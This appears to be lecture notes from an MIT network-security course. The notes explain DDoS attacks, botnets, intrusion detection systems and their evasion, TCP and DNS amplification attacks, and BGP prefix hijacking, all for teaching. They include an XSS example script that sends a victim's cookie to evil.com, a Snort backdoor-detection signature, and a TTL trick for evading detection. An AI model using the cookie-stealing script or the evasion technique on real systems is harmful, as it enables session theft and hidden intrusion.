@@ -1,0 +1,535 @@
+6.033: Security - Network Security
+Lecture 24
+Katrina LaCurts, lacurts@mit.edu
+
+**********************************************************************
+* Disclaimer: This is part of the security section in 6.033. Only    *
+* use the information you learn in this portion of the class to      *
+* secure your own systems, not to attack others.                     *
+**********************************************************************
+
+======================================================================
+Introduction
+======================================================================
+
+Last time we focused on a network adversary.  We protected against
+this adversary observing and tampering with packets by creating a
+secure channel, which provided confidentiality (secrecy) and
+integrity.  The secure channel abstraction used symmetric keys and
+MACs initially, and we exchanged the keys using Diffie-Hellman key
+exchange.  To verify identities, we had to turn to public-key
+cryptography and digital signatures.
+
+Today we're going to focus on a different type of adversary: one who
+is not just passively observing the network, but one who is actively
+using it to attack users.
+
+  Aside: We saw an active network attack last time too, when Eve
+  intercepted the messages in D-H key exchange.  That was our
+  motivation for signatures.
+
+Some of the attacks in this lecture don't even require the adversary
+to observe packet contents, so a secure channel won't necessarily help
+us.
+
+We're going to talk about a few different attacks in this lecture, and
+also why these attacks can be very difficult (almost impossible) to
+detect/prevent.
+
+======================================================================
+DDoS Attacks
+======================================================================
+
+Before, our attacker was intent on reading our messages.  What if he
+just wants to bring down a particular service (i.e., prevent
+legitimate access to an Internet service)?  For instance, maybe the
+attacker wants to bring down the root DNS server(s).  You've learned
+enough about DNS to know what a problem this would be.
+
+To do this, the attacker can try to congest the service and bring it
+down.  If our attacker sends a lot of requests to the root DNS server,
+the root server will spend all its time handling those requests
+instead of serving legitimate requests.
+
+The attacker usually doesn't even need to send legitimate traffic.
+Just sending data at the root server can be enough to overflow the
+queues and prevent legitimate traffic from getting through.
+
+  Aside: You all know how this works.  Queues fill up, packets get
+  dropped, we retransmit, those retransmissions get dropped or
+  excessively delayed such that work can't be completed.
+
+This type of attack is known as a denial of service (DoS) attack.  If
+it's mounted from multiple machines, it's a distributed denial of
+service attack (DDoS).
+
+  Aside: Pronunciation -- "DoS" rhymes with "loss".  "DDoS" is
+  pronounced "Dee DoS".
+
+The attacker can actually target any resource.  Link bandwidth, the
+routing system, access to a database, etc.
+
+----------------------------------------------------------------------
+So what?
+----------------------------------------------------------------------
+
+Is this really that bad?  You've probably heard about DDoS attacks on
+websites.  The site goes down for a few hours, and comes back up once
+the attack is over.  Sure doesn't seem like the end of the world...
+
+But think about the revenue that those sites lose.  If you don't care
+about site revenue, think about if an attacker DDoS'ed your bank
+website, and you lost access to your accounts for a few hours (maybe
+it's the few hours when you go out to rent your first apartment).
+Think about a DDoS attack on the root DNS server, which, if
+successful, would bring the whole Internet to a stand-still.
+
+  Aside: DDoS attempts on the root server happen all. the. time.  A
+  lot of the load on the root server comes from invalid requests that
+  are part of DDoS attacks.
+
+Imagine a DDoS attack on the machines involved in high-frequency
+trading, which would affect the stock market.  Etc.  We now depend on
+the Internet for so much of our commerce/lives that successful DDoS
+attacks can be devastating.
+
+----------------------------------------------------------------------
+Botnets
+----------------------------------------------------------------------
+
+Maybe one solution is to just toughen up our network resources.  Add
+more bandwidth, etc.  Right?  Because how much traffic could an
+attacker with a few machines really generate?
+
+WELL.  Let's talk about botnets.
+
+A botnet is a large collection of compromised machines controlled by
+an attacker.  Think "large collection" as in ~100,000 machines.  What
+could one do with a botnet?  Mount DDoS attacks, among many other
+things.
+
+You might ask, how could so many machines become compromised?  How
+does the attacker control the machines?  And ugh, think about all the
+work I would have to go through to compromise all of these machines to
+build the botnet in the first place?
+
+The last problem is easy to solve: One can rent a botnet.  Recent
+price estimates: for ~$200/day, you can get 10K machines.
+
+  * PLEASE DO NOT GO OUT AND RENT A BOTNET. *
+
+You will talk more in recitation tomorrow about how botnets work and
+what they can do.  I will give you a very quick overview here.
+
+----------------------------------------------------------------------
+How botnets work: a five-minute overview
+----------------------------------------------------------------------
+
+How does a machine get compromised?  There are lots of ways.  Internet
+worms, viruses, trojans, etc.  One common way -- which, again, you'll
+see in recitation tomorrow -- is for a user to visit a vulnerable
+website.
+
+In what way are these websites vulnerable?  Often, they're vulnerable
+to something called a cross-site scripting (XSS) attack.
+
+  Say you have a trusted web server that accepts entries from users.
+  E.g., TrustedBlog.com has a box for users to enter comments on
+  blogs.
+
+  The attacker can embed an executable script in his comment such as:
+
+   <script> document.location = 'http://evil.com/blah.cgi?cookie=' +
+   document.cookie; </script>
+
+   (Students: the above is Javascript code.  We do not expect you to
+   learn or understand Javascript.  We do expect you to understand the
+   general idea of XSS attacks.)
+
+  Now, when a user browses the trusted server, the server sends the
+  comments to the victim's browser, and the victim's browser executes
+  the script.  As a result, it will send the victim's cookie to the
+  attacker's site, and the attacker can impersonate the victim.
+
+An XSS script to compromise a botnet machine would be a bit different
+(we want the user's browser to download some code, not to send a
+cookie), but that is the basic idea for how an XSS attack is mounted.
+They're tricky to detect, although there are web security practices we
+can put in place to avoid them.
+
+Once the user has visited the vulnerable website and, unbeknownst to
+them, downloaded some code, the code will set about installing a
+"rootkit" on the user's machine.  Again, you'll talk more about this
+in lecture -- the process by which this happens is pretty slick.
+
+So basically: visit a compromised website -> download code without
+your knowledge -> code compromises your machine.
+
+Now that your machine is compromised, how does it become part of the
+botnet?
+
+Botnets are typically organized in a hierarchy.  Bots contact command
+and control (C&C) servers, which give them commands that tell them
+what to do.  The software that gets installed on compromised machines
+tells the bots how to contact C&C, and allows it to respond to
+commands.
+
+The commands are, literally, things such as:
+
+  dos <IP> - initiate a DoS attack against the targeted <IP> address
+  
+  Aside: In Trin00, which is a particular piece of software for
+  mounting DDoS attacks, there is a command "mstop", which attempts to
+  stop the current DoS attack.  It was never implemented by the
+  authors, but, you know.  It's the thought that counts.
+
+----------------------------------------------------------------------
+Are there solutions?
+----------------------------------------------------------------------
+
+Now you know how botnets work.  In addition to mounting DDoS attacks,
+attackers use botnets for spam, phishing.. all sorts of things.
+You'll talk much more about this in recitation, and in particular,
+you'll consider how the network attack landscape has changed in the
+advent of botnets.  They make it much easier/more practical to mount a
+lot of attacks.
+
+But for lecture, let's turn our attention to how we might prevent
+these attacks.  Could we do something simple, like block the IP
+addresses of the bots in the botnet?
+
+No.  IPs are easy to spoof, a bot can change its IP address rapidly,
+and this technique won't scale.  So that's out.
+
+Maybe we could try not to prevent attacks, but instead shore up our
+defenses, and distribute our system so that a DDoS attack doesn't
+bring down the entire thing?  This isn't a bad idea (in fact, among
+the reasons for not building centralized systems is "fault tolerance
+against DDoS attacks").  But you've seen from this class how
+complicated distributing a system is.  And sometimes, it's just not
+feasible -- perhaps economically -- to do that.
+
+Back to the blocking IP address thing: How would we even figure out
+which IPs were part of the botnet?  We need a way to detect attacks
+before we prevent them.
+
+======================================================================
+Intrusion Detection
+======================================================================
+
+So let's turn our attention to that.  We're going to talk about some
+approaches to detecting network attacks -- DDoS and otherwise.
+
+----------------------------------------------------------------------
+NIDS Basics
+----------------------------------------------------------------------
+
+First, we have to decide what we're trying to detect here.
+
+- An offending packet?  Maybe one that says "Hello Botnet Command and
+  Control Server!  I am a bot, ready for service."
+
+- That might not work; what if the bot encrypts its data?  (Note: this
+  kind of detection is not necessary a bad idea; we'll return to it in
+  a few minutes)
+
+  Maybe we could detect some attack characteristics?  E.g., we see a
+  lot of machines sending us traffic in the same manner and suspect
+  that they're all bots in a botnet?  Defining this "same manner" is
+  going to be tricky.
+
+Those issues above give rise to the two main approaches to network
+intrusion detection systems (NIDS).  A NIDS box will monitor traffic
+entering and leaving your network, and detect attacks, by one (or
+more) of the following methods:
+
+1. Signature-based: Keep a database of known attack signatures and
+   match traffic against the database.
+
+   A signature might look something like this:
+
+   alert tcp $EXTERNAL_NET any -> $HOME_NET 7597
+   (msg:"MALWARE-BACKDOOR QAZ Worm Client Login access";
+   flow:to_server,established; content:"qazwsx.hsq"; metadata:ruleset
+   community; reference:mcafee,98775; classtype:misc-activity;
+   sid:108; rev:11;)
+
+   (Students, this is strictly for reference.  You do not need to
+   memorize signature rules, nor will we ever expect you to read a
+   signature without any context)
+
+   Pros of this approach:
+   - Easy to understand the outcome  
+   - Accurate in detecting known attacks
+
+   The obvious con, then:
+   - Can't discover new attacks
+   - Also, we can only get the signature after the attack has already
+     happened at least once
+
+2. Anomaly-based: Match traffic against a model of normal traffic and
+   flags abnormalities.
+  
+   Pros
+   - Can deal with new attacks
+
+   Cons
+   - How do we model normal traffic?  It's hard to describe what's
+     normal
+   - As a result, can limit new applications (they have to fit the
+     model of normal traffic or they'll be classified as anomalous)
+   - Less accurate detection of known attacks
+
+Many systems take a hybrid approach.  Match against a database of
+known attacks.  If no match, check for an anomaly.
+
+Examples of NIDS are Bro (bro-ids.org), Snort (snort.org), EMERALD
+(http://www.csl.sri.com/projects/emerald/)
+
+  Full disclosure: I used to work on Bro, so obviously it's the best
+  one.
+
+Most of these systems give users the ability to, once an attack is
+(passively) detected, try to do something to (actively) prevent it.
+That is out of the scope of this lecture.
+
+----------------------------------------------------------------------
+Evasion problems in NIDS
+----------------------------------------------------------------------
+
+Though the theme of this lecture is "network attacks are difficult to
+detect", it still might surprise you just how hard.
+
+Let's take the simplest example: scanning traffic for a particular
+string ("USER root").
+
+Idea 1: Scan for the text in each packet.  No good: text might be
+split across multiple packets.
+
+Idea 2: Remember text from the previous packet (e.g., construct a
+stream of data from the packets you receive, analyze that stream).
+Also no good: packets might be delivered out-of-order.
+
+Idea 3: Fine.  Fully reassemble the byte stream.  This is possible if
+the traffic has sequence numbers attacked (e.g., is TCP traffic).  But
+this costs state, and, unfortunately, is still evadable:
+
+  Attacker ---- NIDS ---> receiver
+
+  Suppose the path from the attacker to NIDS is 15 hops, and path from
+  attacker to receiver is 20 hops.  The below sequence is one example
+  of an attack that works by setting the TTL for a packet (other
+  sequences of this same attack are possible; the packets I gave below
+  are not unique).
+
+  1. Attacker sends two packets:
+     [ n ; TTL=17 ; seq=1 ]
+     [ r ; TTL=23 ; seq=1 ]
+
+     Both packets reach the NIDS, but because of the TTL, only the
+     second reaches the receiver.
+
+     NIDS' state:                       Receiver's state:
+     seq=1: [ n ] or [ r ]              seq=1: [ r ]
+
+  2. Attacker sends two packets:
+     [ o ; TTL=21 ; seq=2 ]
+     [ i ; TTL=15 ; seq=2 ]
+
+     NIDS' state:                       Receiver's state:
+     seq=1: [ n ] or [ r ]              seq=1: [ r ]
+     seq=2: [ o ] or [ i ]              seq=2: [ o ]
+
+  3. Attacker sends one packet:
+     [ o ; TTL=20 ; seq=3 ]  
+
+     NIDS' state:                       Receiver's state:
+     seq=1: [ n ] or [ r ]              seq=1: [ r ]
+     seq=2: [ o ] or [ i ]              seq=2: [ o ]
+     seq=3: [ o ]                       seq=3: [ o ]
+
+  4. Attacker sends two packets:
+     [ c ; TTL=19 ; seq=4 ]
+     [ t ; TTL=27 ; seq=4 ]
+
+     NIDS' state:                       Receiver's state:
+     seq=1: [ n ] or [ r ]              seq=1: [ r ]
+     seq=2: [ o ] or [ i ]              seq=2: [ o ]
+     seq=3: [ o ]                       seq=3: [ o ]
+     seq=4: [ c ] or [ t ]              seq=4: [ t ]
+
+  Now the receiver has no trouble constructing the string "root".  The
+  NIDS, on the other hand, has no clue.  The string could be nooc, or
+  riot, or rioc, etc.
+
+Again, you see the theme here that security is an arms race.  For
+every solution, there's usually a new attack.
+
+Another way to evade detection in NIDS is to try to mount an attack on
+the detection mechanism.  Many NIDS do detection in realtime in stead
+of offline.  Realtime detection may help in throttling the attack, and
+forensics might help in suing the attacker.  But if the attacker can
+mount an attack on the detection mechanism, how might that affect the
+protected system?
+
+======================================================================
+DDoS attacks that mimic legitimate traffic
+======================================================================
+
+Summary so far: NIDS are hard to build.  Even attacks that are "easy"
+to detect -- searching for a particular string -- are hard to detect
+correctly.
+
+Instead of solving this problem, I'm going to make your lives even
+more difficult, and show you some attacks that mimic legitimate
+traffic, making them even *more* difficult to detect.
+
+1. Suppose you ran a web server.  An attacker might flood your
+   webserver with completely legitimate HTTP requests to download a
+   large file, or to perform some computationally intensive database
+   operation.
+
+   Your server will spend much of its database and disk bandwidth
+   resources serving these requests, because there's nothing anomalous
+   about them; no signature is going to recognize a valid HTTP
+   request.
+
+2. TCP SYN floods
+
+   To start a TCP connection, there is a handshake (just like there
+   was a handshake in TLS in the previous lecture).  The client sends
+   a SYN packet to the server, the server stores some state, sends a
+   SYN-ACK packet, and waits for an ACK from the client.
+
+     See RFC4987 for a description of this state, and a lot more about
+     SYN floods: http://tools.ietf.org/html/rfc4987
+
+   An attacker could send many SYN packets to the server, and keep
+   building up the amount of state that the server stores.  This is
+   known as a SYN flood.  The goal here is not for the attacker to
+   exhaust network resources, but to exhaust the state on the server.
+
+   There is actually a fix for this one: the server times out
+   half-open connection
+
+3. Optimistic ACKs
+
+   Imagine a TCP receiver that ACKs packets *before* it receives them,
+   in anticipation of receiving them.  This is known as an optimistic
+   ACK.  It's not part of the TCP spec.
+
+   You can imagine a receiver doing this to try to receive data more
+   quickly, but one can also use it to mount DDoS attacks.
+
+   An attacker starts communicating with a victim, and optimistically
+   ACKs packets that it hasn't received yet.  The victim begins to
+   send faster and faster, effectively saturating its *own* link.
+
+   If the attacker does this to many victims in parallel, particularly
+   if all the victims are on the same local network, the victims will
+   very quickly DoS themselves.
+
+These TCP attacks can be mounted against any machine using TCP: web
+servers, FTP servers, etc.  Don't just think of victims as being
+individual users.
+
+4. DNS reflection/amplification (my favorite way to mount a DDoS
+   attack)
+
+   I own a botnet and want to attack your machine.  I will locate a
+   number of DNS nameservers.  Even better if they are DNSSEC-enabled
+   nameservers.  I'll have my bots send these nameservers DNS requests
+   that are special in two ways:
+
+   - I'll spoof the source to be the victim's IP address (very easy to
+     do), so the DNS responses will go to your machine, not to any of
+     mine.
+
+   - If they're DNSSEC-enabled, I'll request the relevant information
+     (maybe a DNSKEY record).  DNSSEC responses tend to be very large,
+     especially compared to the size of the request, because they have
+     to contain signatures.
+
+   Now, all of the large DNS responses will come to your machine, and
+   effectively DDoS you.
+
+How would we even attempt to prevent this last attack?  The traffic to
+the victim's machine isn't even coming from the botnet machines --
+it's coming from legitimate DNS nameserver.
+
+  Aside: One idea is to ignore DNS responses from nameservers to whom
+  we have not made a request.  But ignoring a response doesn't prevent
+  the response from getting to our machine and filling up the queues.
+
+======================================================================
+Attacks on routers
+======================================================================
+
+To finish up, here's another type of attack, that is sometimes
+involved in DDoS attacks.  Suppose an attacker gains access to a
+router.  What could he do?
+
+1. Overload the router CPU with lots of routing churns
+
+2. Overload the routing table with too many routes
+
+And perhaps most concerning:
+
+3. Prefix hijacking.
+
+   Suppose an attacker gets an AS to announce that it originates a
+   prefix that it doesn't actually own.  Or to announce a more
+   specific (and thus more-preferred) prefix.  Or to just lie that a
+   shorter route exists.
+
+     Aside: You could imagine that last one, and maybe the others,
+     happening in any routing protocol where we have to believe
+     advertisements from other routers.
+
+   What are the consequences?  Packets will end up going to a part of
+   the network where they don't belong.  They could be dropped, or
+   worse.
+
+   For example, one recent attack used prefix hijacking to steal
+   bitcoins: http://www.wired.com/2014/08/isp-bitcoin-theft/
+
+   The most famous prefix hijacking event might be when all YouTube
+   traffic was routed to Pakistan:
+   https://www.ripe.net/publications/news/industry-developments/
+   youtube-hijacking-a-ripe-ncc-ris-case-study
+
+   In some ways, this is a reverse DDoS attack.  Instead of bringing
+   YouTube down by congesting its services, the above issue pulled
+   traffic *away* from YouTube.  Requests that were meant for YouTube
+   went somewhere else entirely.
+
+   Attackers have also used prefix hijacking as a means to mount DDoS
+   attacks.  See:
+   https://greenhost.nl/2013/03/21/spam-not-spam-tracking-hijacked-
+   spamhaus-ip/
+
+What's the right solution here?  Proposals exist to secure BGP so that
+these attacks are possible.  ISPs would sign their advertisements and
+create a chain of accountability, not so dissimilar to what you saw
+yesterday with DNSSEC.  However, lots of signatures = slow!  Without
+authentication, these operations take a few microseconds.  With
+signatures, they're about 100 times slower.
+
+======================================================================
+Moral of the story
+======================================================================
+
+This week has been all about network attacks.  In lecture, you learned
+how to create secure channels so that attackers can't observe packets,
+but today you saw how network attacks exist even if we do that, and
+that these attacks are particularly difficult to detect.
+
+An underlying theme here, which you may not have noticed, is how
+devastating network attacks can be if we attack part of the Internet's
+infrastructure.  E.g., if we attack DNS or BGP.  From yesterday's
+recitation, you saw one proposal to secure part of this infrastructure
+(DNSSEC), and talked about the problems with that proposal and its
+deployment.
+
+Given all of this, it should kind of blow your mind -- and worry you
+-- that so much of the Internet is unsecured.
